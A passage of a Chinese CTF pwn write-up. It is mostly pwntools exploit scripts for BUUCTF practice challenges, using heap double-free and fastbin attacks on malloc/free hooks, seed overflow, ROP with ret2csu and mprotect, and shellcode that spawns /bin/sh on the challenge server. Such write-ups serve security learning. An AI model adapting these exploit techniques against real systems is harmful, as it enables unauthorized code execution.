class="hljs-string">&#x27;2&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Please enter the length of item name:&#x27;</span>,<span class="hljs-built_in">str</span>(length))<br> sa(<span class="hljs-string">&#x27;Please enter the name of item:&#x27;</span>,name)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,length,name</span>):<br> sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Please enter the index of item:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br> sa(<span class="hljs-string">&#x27;Please enter the length of item name:&#x27;</span>,<span class="hljs-built_in">str</span>(length))<br> sla(<span class="hljs-string">&#x27;Please enter the new name of the item:&#x27;</span>,name)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Please enter the index of item:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br> sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br><span class="hljs-comment">#-----------------------------------------------------------------</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;cccc&#x27;</span>)<span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;dddd&#x27;</span>)<span class="hljs-comment">#3</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>))<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;haha&#x27;</span>)<span class="hljs-comment">#1</span><br>show()<br>main_arena_beside=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(main_arena_beside)<br>base=main_arena_beside-<span class="hljs-number">88</span>-<span class="hljs-number">0x3C4B20</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>og=base+o_g_old[<span class="hljs-number">1</span>]<br>malloc_hook=base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>realloc=base + libc.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br><span class="hljs-comment">#----------------------------------------------------------------</span><br>delete(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;hahaha&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)+p64(og)+p64(realloc+<span class="hljs-number">10</span>))<br>sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>sa(<span class="hljs-string">&#x27;Please enter the length of item name:&#x27;</span>,<span class="hljs-string">&#x27;100&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="大二上">大二上</h2><h3 id="qctf-2018-dice-game">qctf_2018_dice_game</h3><p>溢出,控制seed值，使伪随机为固定值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX 50</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">( <span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">int</span> number[MAX] = &#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">int</span> i;<br>srand(<span class="hljs-number">0</span>); <span class="hljs-comment">/*播种子*/</span><br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; MAX; i++)&#123;<br>number[i] = rand() % <span class="hljs-number">6</span>; <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&#x27;%d&#x27;,&quot;</span>, number[i]+<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#r=process(&#x27;./QCTF_2018_dice_game&#x27;)</span><br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29426</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span>+p64(<span class="hljs-number">0</span>))<br>a=[<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    r.recvuntil(<span class="hljs-string">&#x27;Give me the point(1~6): &#x27;</span>)<br>    r.sendline(a[i])<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="xm-2019-awd-pwn2">xm_2019_awd_pwn2</h3><p>这题限制最多创建18个堆，libc2.27加了doublefree检测的话，用fastbin_attack，就差一个堆就可以做出来，（不知是不是awd，被修过）而buu的远端是老版本没有doublefree检测，用tcache doublefree就可以解出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./xm_2019_awd_pwn2&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;&#x27;</span>, )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims          :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#---------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;content:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;idx&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;idx&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-------------------</span><br>add(<span class="hljs-number">0x410</span>,<span class="hljs-string">&#x27;pppp&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#1</span><br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>malloc_hook=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-<span class="hljs-number">96</span>-<span class="hljs-number">0x10</span><br>libc_base=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br>free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>)<span class="hljs-comment">#8</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#9</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(i+<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">8</span>)<br>free(<span class="hljs-number">9</span>)<br>free(<span class="hljs-number">8</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#15</span><br>add(<span class="hljs-number">0x68</span>,p64(malloc_hook-<span class="hljs-number">0x23</span>))<span class="hljs-comment">#16</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#17</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#18</span><br><span class="hljs-comment">#add(0x68,&#x27;&#x27;)#19</span><br>debug()<br><br>r.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./xm_2019_awd_pwn2&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25368</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims          :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#---------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;content:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;idx&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;idx&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-------------------</span><br>add(<span class="hljs-number">0x410</span>,<span class="hljs-string">&#x27;pppp&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#1</span><br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>malloc_hook=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-<span class="hljs-number">96</span>-<span class="hljs-number">0x10</span><br>libc_base=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br>free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#------------------------</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x10</span>,p64(free_hook))<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,p64(system))<br>free(<span class="hljs-number">3</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="shanghai2018-baby-arm">shanghai2018_baby_arm</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r= process([<span class="hljs-string">&quot;qemu-aarch64&quot;</span>, <span class="hljs-string">&quot;-L&quot;</span>, <span class="hljs-string">&quot;/usr/aarch64-linux-gnu&quot;</span>, <span class="hljs-string">&quot;./pwn&quot;</span>])<br><span class="hljs-comment">#r=remote(&#x27;node4.buuoj.cn&#x27;,28119)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.binary = <span class="hljs-string">&quot;./pwn&quot;</span><br>shell=asm(shellcraft.sh())<br>r.sendlineafter(<span class="hljs-string">&#x27;Name:&#x27;</span>,shell)<br>payload=cyclic(<span class="hljs-number">72</span>)+p64(<span class="hljs-number">0x411068</span>)<br>r.sendline(payload)<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.interactive()<br></code></pre></td></tr></table></figure><p>栈溢出，然后利用scu的ROPgadget进行rop，用mprotect提权bss段，后执行bss段的shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r= process([<span class="hljs-string">&quot;qemu-aarch64&quot;</span>, <span class="hljs-string">&quot;-L&quot;</span>, <span class="hljs-string">&quot;/usr/aarch64-linux-gnu&quot;</span>, <span class="hljs-string">&quot;./pwn&quot;</span>])<br><span class="hljs-comment">#r=remote(&#x27;node4.buuoj.cn&#x27;,28119)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.binary = <span class="hljs-string">&quot;./pwn&quot;</span><br>shell=p64(elf.plt[<span class="hljs-string">&#x27;mprotect&#x27;</span>])+asm(shellcraft.sh())<br>r.sendlineafter(<span class="hljs-string">&#x27;Name:&#x27;</span>,shell)<br><span class="hljs-comment">#----------------------------</span><br>csu_down=<span class="hljs-number">0x4008CC</span><br>csu_up=<span class="hljs-number">0x4008AC</span><br>mprotect_addr=<span class="hljs-number">0x411068</span><br>shell_addr=<span class="hljs-number">0x411068</span>+<span class="hljs-number">8</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu_rop</span>(<span class="hljs-params">fun,v1,v2,v3</span>):<br>    csu_down=<span class="hljs-number">0x4008CC</span><br>    csu_up=<span class="hljs-number">0x4008AC</span><br>    payload=p64(csu_down)+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(csu_up)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)<br>    payload+=p64(fun)+p64(v3)+p64(v2)+p64(v1)<br>    <span class="hljs-keyword">return</span> payload<br>payload=cyclic(<span class="hljs-number">72</span>)+csu_rop(mprotect_addr,shell_addr,<span class="hljs-number">0x1000</span>,<span class="hljs-number">7</span>)+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(shell_addr)<br><br>r.sendline(payload)<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="0CTF-2016-warmup">0CTF_2016_warmup</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./warmup&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26363</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br><span class="hljs-comment">#----------------------------------------------------------------------</span><br>main_addr=<span class="hljs-number">0x0804815A</span><br>write_addr=<span class="hljs-number">0x08048135</span><br>read_addr=<span class="hljs-number">0x0804811D</span><br>alarm_addr=<span class="hljs-number">0x0804810D</span><br>data=<span class="hljs-number">0x080491BC</span><br>syscall=<span class="hljs-number">0x08048122</span><br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(read_addr)+p32(main_addr)+p32(<span class="hljs-number">0</span>)+p32(data)+p32(<span class="hljs-number">0x8</span>))<br>r.sendafter(<span class="hljs-string">&#x27;Good 